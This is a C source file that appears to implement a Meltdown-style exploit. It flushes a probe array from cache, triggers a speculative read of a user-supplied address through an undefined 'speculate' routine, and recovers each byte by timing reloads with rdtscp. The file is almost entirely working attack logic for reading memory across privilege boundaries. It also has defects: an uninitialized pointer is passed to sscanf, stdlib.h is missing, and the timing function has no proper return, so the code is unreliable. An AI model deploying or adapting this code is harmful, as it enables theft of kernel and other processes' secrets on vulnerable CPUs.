#include <stdint.h>
#include <stdio.h>
#include <immintrin.h>
#include <string.h>
#include <unistd.h>
#define PAGE_SIZE 4096
#define ARR_SIZE 256

void speculate(void* target_addr, void* L1);
uint8_t leak_cache(void* target_addr, void* L1);
void meltdown(void* addr, uint32_t* size);
uint64_t get_time(void *addr);

void main(int argc, char* argv[]) {

	void* addr;	
	uint32_t* size;

	if(argc < 3) {
		printf("./meltdown [address] [size]\n");
		exit(1);
	}	
	
	if(!sscanf(argv[1], "%p", &addr)) {
		printf("Wrong address\n");
		exit(2);
	}
	
	if(!sscanf(argv[2], "%d", size)) {
		printf("Wrong size\n");
		exit(3);
	}
	
	meltdown(addr, size);
}

void meltdown(void* addr, uint32_t* size){

	void* L1;

	printf("\n[*] Leak addr : %p - %p (%d)\n\n", addr, ((void *)(uint64_t)addr + (uint64_t)*size), *size);

	L1 = malloc(PAGE_SIZE * (ARR_SIZE + 2));
	L1 = (char *)((uint64_t)L1 + 0x1000 >> 12 << 12);	
	memset(L1, 0, PAGE_SIZE * ARR_SIZE);

	printf("=========================\n");
	for (uint32_t i=0; i < *size; i++){
		void* target_addr = addr + i;
		printf("%p : %02x\n", target_addr, leak_cache(target_addr, L1));
	}
	printf("=========================\n");
}

uint64_t get_time(void *addr){
	__asm__ __volatile__(
		"rdtscp\n"
		"shl	$32, %rdx\n"
		"or		%rdx, %rax\n"
		"mov	%rax, %rsi\n"
		"mov	(%rdi), %al\n"
		"rdtscp\n"
		"shl	$32, %rdx\n"
		"or		%rdx, %rax\n"
		"sub	%rsi, %rax\n"
	);
}

uint8_t leak_cache(void* target_addr, void* L1) {
	
	uint64_t deter_table[ARR_SIZE];
	uint32_t res = 0;

	for (uint32_t i=0; i < ARR_SIZE; i++){
		_mm_clflush(L1 + i*PAGE_SIZE);
	}
	// Flush L1 Cache

	syscall(0,0,0,0);
	speculate(target_addr, L1);
	
	for(uint32_t i=0; i < ARR_SIZE; i++){
		deter_table[i] = get_time(L1 + i * PAGE_SIZE);
	}
	
	for(uint32_t i=0; i < ARR_SIZE; i++){
		if(deter_table[res] > deter_table[i])
			res = i;
	}
	return (uint8_t)res;
}
